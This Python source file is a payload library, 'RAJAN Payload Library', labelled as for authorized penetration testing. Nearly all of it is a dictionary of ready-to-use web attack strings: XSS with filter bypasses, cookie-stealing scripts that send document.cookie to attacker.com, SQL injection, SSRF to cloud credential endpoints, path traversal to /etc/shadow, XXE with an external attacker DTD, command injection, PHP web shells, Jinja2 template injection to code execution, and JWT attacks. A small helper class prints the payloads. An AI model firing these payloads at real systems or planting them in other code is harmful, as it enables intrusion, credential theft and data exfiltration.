"""
RAJAN Payload Library
Educational reference for security testing payloads
For authorized penetration testing only
"""

PAYLOADS = {
    "xss": {
        "name": "Cross-Site Scripting (XSS)",
        "mitre": "T1059.007",
        "basic": [
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
        ],
        "bypass_filter": [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert`XSS`</script>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            "javascript:alert('XSS')",
            "<details open ontoggle=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
        ],
        "steal_cookies": [
            "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
            "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>",
        ],
        "dom_xss": [
            "javascript:alert(1)",
            "#<img src=x onerror=alert(1)>",
        ],
    },

    "sqli": {
        "name": "SQL Injection",
        "mitre": "T1190",
        "detection": [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "'; SELECT SLEEP(5)--",
            "' AND SLEEP(5)--",
        ],
        "union": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
        ],
        "blind_time": [
            "'; IF (1=1) WAITFOR DELAY '0:0:5'--",  # MSSQL
            "' AND SLEEP(5)--",                       # MySQL
            "' AND pg_sleep(5)--",                    # PostgreSQL
            "' AND 1=1 AND SLEEP(5)--",
        ],
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
    },

    "ssrf": {
        "name": "Server-Side Request Forgery (SSRF)",
        "mitre": "T1552.005",
        "basic": [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://[::1]/",
        ],
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/",           # AWS
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://169.254.169.254/metadata/instance",            # Azure
        ],
        "bypass": [
            "http://127.1/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "http://127.0.0.1.nip.io/",
        ],
    },

    "path_traversal": {
        "name": "Path Traversal",
        "mitre": "T1083",
        "unix": [
            "../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../etc/hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ],
        "windows": [
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        ],
    },

    "xxe": {
        "name": "XML External Entity (XXE)",
        "mitre": "T1190",
        "basic": [
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
        ],
        "ssrf_via_xxe": [
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>""",
        ],
        "blind": [
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo>test</foo>""",
        ],
    },

    "command_injection": {
        "name": "Command Injection",
        "mitre": "T1059",
        "unix": [
            "; id",
            "| id",
            "& id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| whoami",
            "; ls -la",
            "|| id",
            "&& id",
        ],
        "windows": [
            "& whoami",
            "| whoami",
            "; whoami",
            "& net user",
            "& ipconfig",
        ],
        "blind": [
            "; sleep 5",
            "| sleep 5",
            "& timeout 5",
            "; ping -c 5 127.0.0.1",
        ],
    },

    "lfi": {
        "name": "Local File Inclusion (LFI)",
        "mitre": "T1083",
        "basic": [
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "data://text/plain,<?php system($_GET['c']);?>",
        ],
        "log_poisoning": [
            "<?php system($_GET['c']); ?>",  # Inject in User-Agent for log poisoning
        ],
    },

    "open_redirect": {
        "name": "Open Redirect",
        "mitre": "T1566",
        "payloads": [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https:evil.com",
            "///evil.com",
            "http://evil.com%2F%2Ftarget.com",
        ],
    },

    "ssti": {
        "name": "Server-Side Template Injection (SSTI)",
        "mitre": "T1059",
        "detection": [
            "{{7*7}}",      # Should output 49 if vulnerable
            "${7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "${system('id')}",
        ],
        "rce_jinja2": [
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        ],
    },

    "jwt": {
        "name": "JWT Token Attacks",
        "mitre": "T1078",
        "attacks": [
            "Algorithm confusion: change 'alg' to 'none'",
            "Algorithm confusion: RS256 to HS256 with public key",
            "Weak secret brute force: hashcat -a 0 -m 16500 token wordlist.txt",
            "JWT header injection: add 'jku' or 'x5u' pointing to attacker server",
            "Kid injection: 'kid': '../../../../dev/null' or SQLi in kid",
        ],
    },
}


class PayloadLibrary:
    def __init__(self):
        self.db = PAYLOADS

    def get_category(self, category):
        return self.db.get(category.lower())

    def list_categories(self):
        return list(self.db.keys())

    def get_payloads(self, category, subcategory=None):
        cat = self.db.get(category.lower(), {})
        if not cat:
            return []
        if subcategory:
            return cat.get(subcategory, [])
        # Return all payloads from all subcategories
        all_payloads = []
        for key, val in cat.items():
            if isinstance(val, list):
                all_payloads.extend(val)
        return all_payloads

    def print_category(self, category):
        cat = self.db.get(category.lower())
        if not cat:
            print(f"  ❌ Category '{category}' not found")
            print(f"  Available: {', '.join(self.list_categories())}")
            return

        print(f"\n  ╔══════════════════════════════════════════════════╗")
        print(f"  ║  {cat['name']:<49}║")
        print(f"  ║  MITRE: {cat.get('mitre', 'N/A'):<43}║")
        print(f"  ╚══════════════════════════════════════════════════╝\n")

        for key, val in cat.items():
            if key in ("name", "mitre"):
                continue
            if isinstance(val, list):
                print(f"  [{key.upper()}]")
                for p in val:
                    print(f"    • {p}")
                print()

        print(f"  ⚠️  Educational use and authorized testing ONLY!\n")

    def print_all(self):
        print(f"\n  📚 RAJAN Payload Library\n")
        for cat_key in self.db:
            cat = self.db[cat_key]
            count = sum(len(v) for v in cat.values() if isinstance(v, list))
            print(f"  • {cat['name']:<40} ({count} payloads)")
        print(f"\n  Type 'payloads <category>' to see specific payloads")
        print(f"  Example: payloads xss\n")
